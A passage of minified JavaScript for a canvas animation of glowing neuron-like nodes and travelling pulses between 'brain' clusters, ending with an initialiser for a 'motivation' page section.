        if(p.t>=1){pulses.splice(i,1);for(let k=0;k<3;k++)fire(T.dst.n[Math.floor(Math.random()*T.dst.n.length)])}continue}
      const e=p.o.e,a=p.o.from,b=p.o.to,c=ctrl(e),x=q(a.x,c.x,b.x,p.t),y=q(a.y,c.y,b.y,p.t);
      dot(x,y,5.5,e.col,.85*e.alpha+.1);e.glow=Math.min(1,e.glow+.07);
      if(p.t>=1){pulses.splice(i,1);b.v0+=e.w;if(b.v0>=1&&b.flash<.2)fire(b)}}
    if(pulses.length>220)pulses.splice(0,pulses.length-220);
    brains.forEach(B=>B.n.forEach(n=>{n.v0*=.996;if(Math.random()<.0007)fire(n);
      if(n.flash>.02){const R=n.r*5*n.flash+3,g=ctx.createRadialGradient(n.x,n.y,0,n.x,n.y,R);
        g.addColorStop(0,`rgba(${B.col},${.6*n.flash})`);g.addColorStop(1,`rgba(${B.col},0)`);ctx.fillStyle=g;ctx.beginPath();ctx.arc(n.x,n.y,R,0,6.2832);ctx.fill()}
      ctx.fillStyle=`rgba(${B.col},${(.35+n.flash*.65)*Math.min(1,B.alpha+.25)})`;ctx.beginPath();ctx.arc(n.x,n.y,n.r,0,6.2832);ctx.fill();n.flash*=.93}));
    if(talk&&Math.random()<.006)pulses.push({talk:true,t:0,s:.006});
    if(on&&!reduce)raf=requestAnimationFrame(frame);
  }
  build();if(reduce)brains.forEach(B=>B.n.slice(0,4).forEach(fire));frame();
  let rt;addEventListener('resize',()=>{clearTimeout(rt);rt=setTimeout(()=>{cancelAnimationFrame(raf);build();frame()},200)});
}

function initMotivation(){
    if(!document.getElementById('motivation'))return;
    Chars.mount();
    initMotivationSequence();
    initNeuroBackground();
}
